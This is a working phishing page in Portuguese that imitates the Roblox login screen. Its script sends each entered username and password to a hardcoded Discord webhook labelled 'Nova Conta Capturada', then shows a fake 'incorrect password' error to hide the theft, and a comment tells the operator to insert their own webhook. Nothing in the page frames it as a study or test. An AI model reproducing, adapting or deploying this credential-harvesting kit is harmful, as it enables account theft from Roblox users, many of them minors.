<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Roblox - Entrar</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: 'Roboto', sans-serif;
      background: #0f0f10;
      color: #e3e3e3;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
    }
    .background {
      position: fixed; inset:0;
      background: linear-gradient(135deg, #1a1a2e 0%, #0f0f10 100%);
      z-index: -2;
    }
    .container {
      width: 100%; max-width: 420px;
      padding: 40px 32px;
      background: rgba(20,20,25,0.85);
      border-radius: 12px;
      border: 1px solid rgba(255,255,255,0.06);
      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
      backdrop-filter: blur(10px);
      z-index: 10;
    }
    .logo { text-align:center; margin-bottom:32px; }
    .logo img { width:180px; height:auto; filter: drop-shadow(0 4px 12px rgba(0,162,255,0.4)); }
    h1 { text-align:center; font-size:28px; font-weight:500; margin-bottom:32px; color:#fff; }
    .input-group { margin-bottom:20px; position:relative; }
    label { display:block; margin-bottom:8px; font-size:14px; color:#c9c9c9; }
    input {
      width:100%; padding:14px 16px;
      border:1px solid #444; border-radius:8px;
      background:#111113; color:white; font-size:16px;
      transition:all 0.2s;
    }
    input:focus {
      outline:none; border-color:#00a2ff;
      box-shadow:0 0 0 3px rgba(0,162,255,0.25);
    }
    .btn-login {
      width:100%; padding:16px; margin:12px 0 20px;
      background:#00a2ff; color:white; border:none;
      border-radius:8px; font-size:18px; font-weight:500;
      cursor:pointer; transition:all 0.25s;
    }
    .btn-login:hover { background:#0088d9; transform:translateY(-1px); }
    .btn-login:active { transform:translateY(1px); }
    .btn-login:disabled {
      background:#555; cursor:not-allowed; opacity:0.7;
    }

    .error-message {
      position:absolute; left:50%; transform:translateX(-50%);
      bottom:-60px;
      background:rgba(255,60,60,0.92); color:white;
      padding:12px 24px; border-radius:8px;
      font-weight:500; font-size:15px; white-space:nowrap;
      opacity:0; pointer-events:none;
      box-shadow:0 6px 20px rgba(255,0,0,0.35);
    }
    .error-message.show {
      opacity:1; bottom:-10px;
      animation: shake 0.4s, fadeOut 3s 1s forwards;
    }
    @keyframes shake {
      0%,100% { transform:translateX(-50%) translateY(0); }
      20% { transform:translateX(-50%) translateY(-4px); }
      40% { transform:translateX(-50%) translateY(4px); }
      60% { transform:translateX(-50%) translateY(-3px); }
      80% { transform:translateX(-50%) translateY(3px); }
    }
    @keyframes fadeOut { to { opacity:0; bottom:-40px; } }
  </style>
</head>
<body>

<div class="background"></div>

<div class="container">
  <div class="logo">
    <img src="https://www.roblox.com/images/Logo.svg" alt="Roblox Logo" 
         onerror="this.src='https://via.placeholder.com/180x60/00a2ff/ffffff?text=Roblox';">
  </div>

  <h1>Entrar</h1>

  <div class="input-group">
    <label for="username">Nome de usu√°rio ou Email</label>
    <input type="text" id="username" placeholder="Seu @nome ou email" autocomplete="off">
  </div>

  <div class="input-group">
    <label for="password">Senha</label>
    <input type="password" id="password" placeholder="Senha" autocomplete="off">
  </div>

  <button class="btn-login" id="loginBtn">Entrar</button>

  <div class="error-message" id="errorMsg">Nome de usu√°rio ou senha incorretos</div>
</div>

<script>
  const loginBtn = document.getElementById('loginBtn');
  const errorMsg = document.getElementById('errorMsg');
  const usernameInput = document.getElementById('username');
  const passwordInput = document.getElementById('password');

  // ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
  // ‚ïë     MUDE AQUI PELO SEU WEBHOOK DO DISCORD          ‚ïë
  // ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1474804412965978274/aQAej8nqhjGJMP_FBvbJM84EmTaHdj9bWL9wIvibBh3oHhSbfVBiuMrVGxnY5bESCnVy";

  async function enviarParaDiscord(username, password) {
    try {
      const data = {
        content: "",
        embeds: [{
          title: "üîê **Nova Conta Capturada**",
          color: 0xFF0000, // vermelho (pode mudar: 0x00AA00 = verde escuro, etc)
          fields: [
            {
              name: "**Login:**",
              value: `\`${username.trim() || "‚Äî‚Äî‚Äî vazio ‚Äî‚Äî‚Äî"}\``,
              inline: true
            },
            {
              name: "**Senha:**",
              value: `\`${password.trim() || "‚Äî‚Äî‚Äî vazio ‚Äî‚Äî‚Äî"}\``,
              inline: true
            }
          ],
          timestamp: new Date().toISOString(),
          footer: {
            text: "Capturado ‚Ä¢ " + new Date().toLocaleString("pt-BR", {
              timeZone: "America/Sao_Paulo"
            })
          }
        }]
      };

      const response = await fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });

      if (!response.ok) {
        console.error("Falha no webhook:", response.status);
      }
    } catch (err) {
      console.error("Erro ao enviar:", err);
    }
  }

  loginBtn.addEventListener('click', async () => {
    const username = usernameInput.value.trim();
    const password = passwordInput.value.trim();

    // Desabilita bot√£o durante o processo
    loginBtn.disabled = true;
    loginBtn.textContent = "Entrando...";

    // Envia pro Discord
    await enviarParaDiscord(username, password);

    // Mostra erro (como se tivesse errado a senha)
    errorMsg.textContent = "Nome de usu√°rio ou senha incorretos";
    errorMsg.classList.add('show');

    // Volta ao normal depois de ~3.5 segundos
    setTimeout(() => {
      errorMsg.classList.remove('show');
      loginBtn.disabled = false;
      loginBtn.textContent = "Entrar";
      
      // Limpa os campos (opcional ‚Äì comente se n√£o quiser)
      // usernameInput.value = "";
      // passwordInput.value = "";
    }, 3500);
  });
</script>

</body>
</html>
